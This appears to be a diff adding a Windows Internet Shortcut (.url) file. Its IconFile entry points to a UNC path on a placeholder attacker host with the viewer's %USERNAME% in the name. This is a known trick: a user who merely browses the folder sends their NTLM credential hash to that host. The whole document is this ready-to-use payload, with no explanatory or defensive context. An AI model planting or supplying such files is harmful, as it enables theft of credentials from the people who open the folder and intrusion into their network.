@@ -1,0 +1,5 @@
+[InternetShortcut]
+URL=blah
+WorkingDirectory=blah
+IconFile=\\<Attacker-IP>\%USERNAME%.icon
+IconIndex=1
